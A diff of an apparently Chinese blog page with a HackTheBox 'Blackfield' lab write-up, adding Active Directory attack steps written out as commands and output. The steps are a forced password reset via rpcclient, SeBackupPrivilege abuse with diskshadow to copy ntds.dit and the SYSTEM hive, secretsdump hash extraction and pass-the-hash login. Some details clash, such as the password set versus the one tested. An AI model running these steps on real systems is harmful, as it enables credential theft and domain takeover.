@@ -1814,8 +1814,7 @@ AutoType Fastjson 最大的特色也是其最大的安全隐患 &amp;ndash; Auto
 </span></span><span style="display:flex;"><span>4f694e3efe5e0a11a0d1e9cf965011b6eabd88ab3b684cc38af7fdc4e926361dd3f1c46e09156b2f87e40228fa1b75ff7556b1a9695ed480e8f291f4aa52b5b4da279dfefc88b4341ba639177d0e3a35cf94b4479d18e2971e59399fe9706cc16465bc3e31b9452931
 </span></span><span style="display:flex;"><span>ebcc43b322f95f2f01911ba1f5d732595cb41b8c38be1c78ad720b2e748eea49adf93956cc08a7e9102ce500f06fb0854cbcc6895dd6120781e26732ff2dfeb0c19e09647514 
 </span></span></code></pre></div><p>执行 hashcat 爆破。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">```</span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Blackfield<span style="color:#f92672">]</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Blackfield<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ hashcat -m <span style="color:#ae81ff">18200</span> Directory/support_hash.txt /usr/share/wordlists/rockyou.txt
 </span></span><span style="display:flex;"><span>hashcat <span style="color:#f92672">(</span>v7.1.2<span style="color:#f92672">)</span> starting
 </span></span><span style="display:flex;"><span>
@@ -2207,7 +2206,7 @@ AutoType Fastjson 最大的特色也是其最大的安全隐患 &amp;ndash; Auto
 </span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Blackfield/smb_forensic<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ ls -liah lsass.DMP 
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">2781568</span> -rw-rw-r-- <span style="color:#ae81ff">1</span> kali kali 137M Feb <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2020</span> lsass.DMP
-</span></span></code></pre></div><p>用 pypykata dump lsass，并将结果保存下来。</p>
+</span></span></code></pre></div><p>用 pypykatz dump lsass，并将结果保存下来。</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Blackfield<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ pypykatz lsa minidump lsass.DMP | tee ../lass.txt
 </span></span><span style="display:flex;"><span>FILE: <span style="color:#f92672">========</span> lsass.DMP <span style="color:#f92672">=======</span>
@@ -12496,6 +12495,197 @@ Nmap 详细信息扫描 ┌──(kali㉿kali)-[~/Work/Kali] └─$ sudo nmap -
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PowerShell" data-lang="PowerShell"><span style="display:flex;"><span>Add-DomainObjectAcl -TargetIdentity <span style="color:#e6db74">&#39;Backup_Admins&#39;</span> -PrincipalIdentity claire -Rights WriteMembers
 </span></span></code></pre></div><p>将 <code>claire</code> 添加为 <code>Backup_Admins</code> 成员。</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PowerShell" data-lang="PowerShell"><span style="display:flex;"><span>Add-DomainGroupMember -Identity <span style="color:#e6db74">&#34;Backup_Admins&#34;</span> -Members claire
+</span></span></code></pre></div><h3 id="forcechangepassword">ForceChangePassword</h3>
+<p>使用 rpcclient 连接 support，使用 setuserinfo2 修改 audit2020 的密码为 <code>123456</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Blackfield<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ rpcclient -U <span style="color:#e6db74">&#39;BLACKFIELD/support%#00^BlackKnight&#39;</span> 10.129.229.17
+</span></span><span style="display:flex;"><span>rpcclient $&gt; setuserinfo2 audit2020 <span style="color:#ae81ff">23</span> <span style="color:#e6db74">&#39;123456&#39;</span>
+</span></span></code></pre></div><p>验证是否修改成功。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Blackfield<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc smb 10.129.229.17 -u audit2020 -p <span style="color:#e6db74">&#39;P@ssword&#39;</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.229.17   <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:DC01<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:BLACKFIELD.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:None<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Null Auth:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.229.17   <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> BLACKFIELD.local<span style="color:#ae81ff">\a</span>udit2
+</span></span></code></pre></div><h3 id="sebackupprivilege-1">SeBackupPrivilege</h3>
+<p>SeBackupPrivilege 是 Windows 的备份文件和目录特权，启用时可以绕过 NTFS ACL 文件权限检查，读取本来无权读取的敏感文件。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc_backup<span style="color:#ae81ff">\D</span>esktop&gt; whoami /priv
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PRIVILEGES INFORMATION
+</span></span><span style="display:flex;"><span>----------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Privilege Name                Description                    State
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=============================</span> <span style="color:#f92672">==============================</span> <span style="color:#f92672">=======</span>
+</span></span><span style="display:flex;"><span>SeMachineAccountPrivilege     Add workstations to domain     Enabled
+</span></span><span style="display:flex;"><span>SeBackupPrivilege             Back up files and directories  Enabled
+</span></span><span style="display:flex;"><span>SeRestorePrivilege            Restore files and directories  Enabled
+</span></span><span style="display:flex;"><span>SeShutdownPrivilege           Shut down the system           Enabled
+</span></span><span style="display:flex;"><span>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+</span></span><span style="display:flex;"><span>SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc_backup<span style="color:#ae81ff">\D</span>esktop&gt; whoami /groups
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GROUP INFORMATION
+</span></span><span style="display:flex;"><span>-----------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Group Name                                 Type             SID          Attributes
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==========================================</span> <span style="color:#f92672">================</span> <span style="color:#f92672">============</span> <span style="color:#f92672">==================================================</span>
+</span></span><span style="display:flex;"><span>Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>BUILTIN<span style="color:#ae81ff">\B</span>ackup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>BUILTIN<span style="color:#ae81ff">\R</span>emote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>BUILTIN<span style="color:#ae81ff">\U</span>sers                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>BUILTIN<span style="color:#ae81ff">\P</span>re-Windows <span style="color:#ae81ff">2000</span> Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\N</span>ETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\A</span>uthenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\T</span>his Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\N</span>TLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>Mandatory Label<span style="color:#ae81ff">\H</span>igh Mandatory Level       Label            S-1-16-12288
+</span></span></code></pre></div><p>在 Kali 中制作提权脚本。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Blackfield<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ printf <span style="color:#e6db74">&#39;set context persistent nowriters\r\nadd volume c: alias cdrive\r\ncreate\r\nexpose %%cdrive%% z:\r\n&#39;</span> &gt; dshadow.txt                                                                                
+</span></span><span style="display:flex;"><span>                                                                                                        
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Blackfield<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ xxd dshadow.txt 
+</span></span><span style="display:flex;"><span>00000000: <span style="color:#ae81ff">7365</span> <span style="color:#ae81ff">7420</span> 636f 6e74 <span style="color:#ae81ff">6578</span> <span style="color:#ae81ff">7420</span> <span style="color:#ae81ff">7065</span> <span style="color:#ae81ff">7273</span>  set context pers
+</span></span><span style="display:flex;"><span>00000010: <span style="color:#ae81ff">6973</span> <span style="color:#ae81ff">7465</span> 6e74 206e 6f77 <span style="color:#ae81ff">7269</span> <span style="color:#ae81ff">7465</span> <span style="color:#ae81ff">7273</span>  istent nowriters
+</span></span><span style="display:flex;"><span>00000020: 0d0a <span style="color:#ae81ff">6164</span> <span style="color:#ae81ff">6420</span> 766f 6c75 6d65 <span style="color:#ae81ff">2063</span> 3a20  ..add volume c: 
+</span></span><span style="display:flex;"><span>00000030: 616c <span style="color:#ae81ff">6961</span> <span style="color:#ae81ff">7320</span> <span style="color:#ae81ff">6364</span> <span style="color:#ae81ff">7269</span> <span style="color:#ae81ff">7665</span> 0d0a <span style="color:#ae81ff">6372</span>  alias cdrive..cr
+</span></span><span style="display:flex;"><span>00000040: <span style="color:#ae81ff">6561</span> <span style="color:#ae81ff">7465</span> 0d0a <span style="color:#ae81ff">6578</span> 706f <span style="color:#ae81ff">7365</span> <span style="color:#ae81ff">2025</span> <span style="color:#ae81ff">6364</span>  eate..expose %cd
+</span></span><span style="display:flex;"><span>00000050: <span style="color:#ae81ff">7269</span> <span style="color:#ae81ff">7665</span> <span style="color:#ae81ff">2520</span> 7a3a 0d0a                 rive% z:..
+</span></span></code></pre></div><p>解释一下这个脚本：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-dshadow.txt" data-lang="dshadow.txt"><span style="display:flex;"><span>set context persistent nowriters
+</span></span><span style="display:flex;"><span>add volume c: alias cdrive
+</span></span><span style="display:flex;"><span>create
+</span></span><span style="display:flex;"><span>expose %cdrive% z:
+</span></span></code></pre></div><ul>
+<li><code>persistent</code>：让创建的卷影副本在 diskshadow 退出后仍然存在</li>
+<li><code>nowriters</code>：不通知 VSS Writers 去协调程序写入，因此创建的更快，但一致性保障较弱</li>
+<li><code>add volume c: alias cdrive</code>：指定 C 盘创建卷影副本，别名为 cdrive</li>
+<li><code>expose %cdrive% z:</code>：创建 C盘 快照，挂载为<code> z:</code> 盘</li>
+</ul>
+<p>上传至目标机器，并验证完整性。</p>
+<p>挂载。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\p</span>rogramdata<span style="color:#ae81ff">\a</span>pps&gt; upload dshadow.txt
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Uploading /home/kali/Work/Kali/Blackfield/dshadow.txt to C:<span style="color:#ae81ff">\p</span>rogramdata<span style="color:#ae81ff">\a</span>pps<span style="color:#ae81ff">\d</span>shadow.txt
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Data: <span style="color:#ae81ff">120</span> bytes of <span style="color:#ae81ff">120</span> bytes copied
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Upload successful!
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\p</span>rogramdata<span style="color:#ae81ff">\a</span>pps&gt; Get-Content C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc_backup<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\d</span>shadow.txt
+</span></span><span style="display:flex;"><span>set context persistent nowriters
+</span></span><span style="display:flex;"><span>add volume c: alias cdrive
+</span></span><span style="display:flex;"><span>create
+</span></span><span style="display:flex;"><span>expose %cdrive% z:
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\p</span>rogramdata<span style="color:#ae81ff">\a</span>pps&gt; Format-Hex C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc_backup<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\d</span>shadow.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>           Path: C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc_backup<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\d</span>shadow.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>           <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">02</span> <span style="color:#ae81ff">03</span> <span style="color:#ae81ff">04</span> <span style="color:#ae81ff">05</span> <span style="color:#ae81ff">06</span> <span style="color:#ae81ff">07</span> <span style="color:#ae81ff">08</span> <span style="color:#ae81ff">09</span> 0A 0B 0C 0D 0E 0F
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>   <span style="color:#ae81ff">73</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">63</span> 6F 6E <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">78</span> <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">70</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">72</span> <span style="color:#ae81ff">73</span>  set context pers
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000010</span>   <span style="color:#ae81ff">69</span> <span style="color:#ae81ff">73</span> <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">65</span> 6E <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">20</span> 6E 6F <span style="color:#ae81ff">77</span> <span style="color:#ae81ff">72</span> <span style="color:#ae81ff">69</span> <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">72</span> <span style="color:#ae81ff">73</span>  istent nowriters
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000020</span>   0A <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">64</span> <span style="color:#ae81ff">64</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">76</span> 6F 6C <span style="color:#ae81ff">75</span> 6D <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">63</span> 3A <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">61</span>  .add volume c: a
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000030</span>   6C <span style="color:#ae81ff">69</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">73</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">63</span> <span style="color:#ae81ff">64</span> <span style="color:#ae81ff">72</span> <span style="color:#ae81ff">69</span> <span style="color:#ae81ff">76</span> <span style="color:#ae81ff">65</span> 0A <span style="color:#ae81ff">63</span> <span style="color:#ae81ff">72</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">61</span>  lias cdrive.crea
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000040</span>   <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">65</span> 0A <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">78</span> <span style="color:#ae81ff">70</span> 6F <span style="color:#ae81ff">73</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">25</span> <span style="color:#ae81ff">63</span> <span style="color:#ae81ff">64</span> <span style="color:#ae81ff">72</span> <span style="color:#ae81ff">69</span> <span style="color:#ae81ff">76</span>  te.expose %cdriv
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000050</span>   <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">25</span> <span style="color:#ae81ff">20</span> 7A 3A 0D 0A                             e% z:..
+</span></span></code></pre></div><p>验证挂载并复制 <code>ntds.dit</code> 与 <code>SYSTEM</code>。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\p</span>rogramdata<span style="color:#ae81ff">\a</span>pps&gt; ls Z:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\N</span>TDS
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory: Z:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\N</span>TDS
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                -------------         ------ ----
+</span></span><span style="display:flex;"><span>-a----        4/10/2023   6:29 PM           <span style="color:#ae81ff">8192</span> edb.chk
+</span></span><span style="display:flex;"><span>-a----        4/27/2026  11:02 AM       <span style="color:#ae81ff">10485760</span> edb.log
+</span></span><span style="display:flex;"><span>-a----        2/23/2020   9:41 AM       <span style="color:#ae81ff">10485760</span> edb00004.log
+</span></span><span style="display:flex;"><span>-a----        2/23/2020   9:41 AM       <span style="color:#ae81ff">10485760</span> edb00005.log
+</span></span><span style="display:flex;"><span>-a----        2/23/2020   3:13 AM       <span style="color:#ae81ff">10485760</span> edbres00001.jrs
+</span></span><span style="display:flex;"><span>-a----        2/23/2020   3:13 AM       <span style="color:#ae81ff">10485760</span> edbres00002.jrs
+</span></span><span style="display:flex;"><span>-a----        2/23/2020   9:41 AM       <span style="color:#ae81ff">10485760</span> edbtmp.log
+</span></span><span style="display:flex;"><span>-a----        4/27/2026  10:31 AM       <span style="color:#ae81ff">18874368</span> ntds.dit
+</span></span><span style="display:flex;"><span>-a----        4/27/2026  10:31 AM          <span style="color:#ae81ff">16384</span> ntds.jfm
+</span></span><span style="display:flex;"><span>-a----        4/27/2026  10:31 AM         <span style="color:#ae81ff">434176</span> temp.edb
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\p</span>rogramdata<span style="color:#ae81ff">\a</span>pps&gt; mkdir ntds
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory: C:<span style="color:#ae81ff">\p</span>rogramdata<span style="color:#ae81ff">\a</span>pps
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                -------------         ------ ----
+</span></span><span style="display:flex;"><span>d-----        4/27/2026  11:10 AM                ntds
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\p</span>rogramdata<span style="color:#ae81ff">\a</span>pps&gt; robocopy /b Z:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\N</span>TDS C:<span style="color:#ae81ff">\p</span>rogramdata<span style="color:#ae81ff">\a</span>pps<span style="color:#ae81ff">\n</span>tds ntds.dit
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\p</span>rogramdata<span style="color:#ae81ff">\a</span>pps&gt; reg save HKLM<span style="color:#ae81ff">\S</span>YSTEM C:<span style="color:#ae81ff">\p</span>rogramdata<span style="color:#ae81ff">\a</span>pps<span style="color:#ae81ff">\n</span>tds<span style="color:#ae81ff">\S</span>YSTEM
+</span></span><span style="display:flex;"><span>The operation completed successfully.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\p</span>rogramdata<span style="color:#ae81ff">\a</span>pps&gt; dir ntds
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory: C:<span style="color:#ae81ff">\p</span>rogramdata<span style="color:#ae81ff">\a</span>pps<span style="color:#ae81ff">\n</span>tds
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                -------------         ------ ----
+</span></span><span style="display:flex;"><span>-a----        4/27/2026  10:31 AM       <span style="color:#ae81ff">18874368</span> ntds.dit
+</span></span><span style="display:flex;"><span>-a----        4/27/2026  11:11 AM       <span style="color:#ae81ff">17383424</span> SYSTEM
+</span></span></code></pre></div><p>下载至 kali。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\p</span>rogramdata<span style="color:#ae81ff">\a</span>pps<span style="color:#ae81ff">\n</span>tds&gt; download ntds.dit
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Downloading C:<span style="color:#ae81ff">\p</span>rogramdata<span style="color:#ae81ff">\a</span>pps<span style="color:#ae81ff">\n</span>tds<span style="color:#ae81ff">\n</span>tds.dit to ntds.dit
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Download successful!
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\p</span>rogramdata<span style="color:#ae81ff">\a</span>pps<span style="color:#ae81ff">\n</span>tds&gt; download SYSTEM
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Downloading C:<span style="color:#ae81ff">\p</span>rogramdata<span style="color:#ae81ff">\a</span>pps<span style="color:#ae81ff">\n</span>tds<span style="color:#ae81ff">\S</span>YSTEM to SYSTEM
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Download successful!
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Blackfield<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ls -liah SYSTEM     
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2781608</span> -rw-rw-r-- <span style="color:#ae81ff">1</span> kali kali 17M Apr <span style="color:#ae81ff">27</span> 07:24 SYSTEM
+</span></span><span style="display:flex;"><span>                                                                                                                              
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Blackfield<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ls -liha ntds.dit
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2792050</span> -rw-rw-r-- <span style="color:#ae81ff">1</span> kali kali 18M Apr <span style="color:#ae81ff">27</span> 07:19 ntds.dit
+</span></span></code></pre></div><p>使用 secretsdump 爆破 hash。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Blackfield<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL | tee HASH.txt
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Blackfield<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ head -n <span style="color:#ae81ff">10</span> HASH.txt 
+</span></span><span style="display:flex;"><span>Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping Domain Credentials <span style="color:#f92672">(</span>domain<span style="color:#ae81ff">\u</span>id:rid:lmhash:nthash<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Searching <span style="color:#66d9ef">for</span> pekList, be patient
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> PEK <span style="color:#75715e"># 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Reading and decrypting hashes from ntds.dit 
+</span></span><span style="display:flex;"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
+</span></span><span style="display:flex;"><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span style="display:flex;"><span>DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7f82cc4be7ee6ca0b417c0719479dbec:::
+</span></span></code></pre></div><p>使用 hash 登录 Administrator 得到 root flag。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Blackfield<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ evil-winrm -i 10.129.25.101 -u Administrator -H 184fb5e5178480be64824d4cd53b99ee
